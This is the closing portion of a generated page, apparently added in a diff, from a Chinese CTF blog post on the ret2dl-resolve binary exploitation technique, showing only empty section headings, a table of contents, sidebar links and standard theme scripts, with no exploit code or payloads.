+<h3 id="ctf2025_only_read"><a class="markdownIt-Anchor" href="#ctf2025_only_read"></a> CTF2025_only_read</h3>
+<h3 id="dasctf2025上半年赛_mini"><a class="markdownIt-Anchor" href="#dasctf2025上半年赛_mini"></a> DASCTF2025上半年赛_mini</h3>
+<h2 id="32位程序"><a class="markdownIt-Anchor" href="#32位程序"></a> 32位程序</h2>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://iyheart.github.io">iyheart</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://iyheart.github.io/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/">http://iyheart.github.io/2025/07/04/CTFblog/PWN系列blog/Linux_pwn/1.栈系列/ret2dlresolve/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://iyheart.github.io" target="_blank">iyheart的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover186.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" target="_blank"><img class="post-qr-code-img" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/07/03/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Linux%E9%80%86%E5%90%91/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover187.png" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ELF文件格式</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">iyheart</div><div class="author-info__description">悟已往之不谏，知来者之可追</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">148</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6lazy-blinding"><span class="toc-number">1.1.</span> <span class="toc-text"> 延迟绑定机制(Lazy Blinding)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#got%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.1.</span> <span class="toc-text"> GOT表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#plt%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.2.</span> <span class="toc-text"> PLT表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 延迟绑定流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#_dl_runtime_resolve%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> _dl_runtime_resolve执行流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#_dl_fixup"><span class="toc-number">1.2.1.</span> <span class="toc-text"> _dl_fixup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 传入参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E8%BF%87%E7%A8%8B%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 重要过程与结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dl-resolve"><span class="toc-number">2.</span> <span class="toc-text"> ret2dl-resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text"> 64位程序的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#no-relro%E6%83%85%E5%86%B5%E4%BE%8B%E9%A2%98"><span class="toc-number">2.1.1.</span> <span class="toc-text"> NO RELRO情况例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text"> 32位程序的利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text"> 相关题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.1.</span> <span class="toc-text"> 64位程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctf2025_only_read"><span class="toc-number">3.1.1.</span> <span class="toc-text"> CTF2025_only_read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dasctf2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B_mini"><span class="toc-number">3.1.2.</span> <span class="toc-text"> DASCTF2025上半年赛_mini</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.2.</span> <span class="toc-text"> 32位程序</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/" title="ret2dl-resolve">ret2dl-resolve</a><time datetime="2025-07-04T07:12:36.000Z" title="发表于 2025-07-04 15:12:36">2025-07-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/03/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Linux%E9%80%86%E5%90%91/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式">ELF文件格式</a><time datetime="2025-07-02T16:43:45.000Z" title="发表于 2025-07-03 00:43:45">2025-07-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E5%9D%97%E5%8A%A0%E5%AF%86/%E5%9D%97%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/" title="块加密工作模式">块加密工作模式</a><time datetime="2025-06-17T17:32:15.000Z" title="发表于 2025-06-18 01:32:15">2025-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/large-bin-attack/" title="large_bin_attack1">large_bin_attack1</a><time datetime="2025-06-13T15:27:10.000Z" title="发表于 2025-06-13 23:27:10">2025-06-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack2/" title="tcache_poisoning">tcache_poisoning</a><time datetime="2025-06-03T16:46:30.000Z" title="发表于 2025-06-04 00:46:30">2025-06-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By iyheart</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script></div><script src="/zhheo/random.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
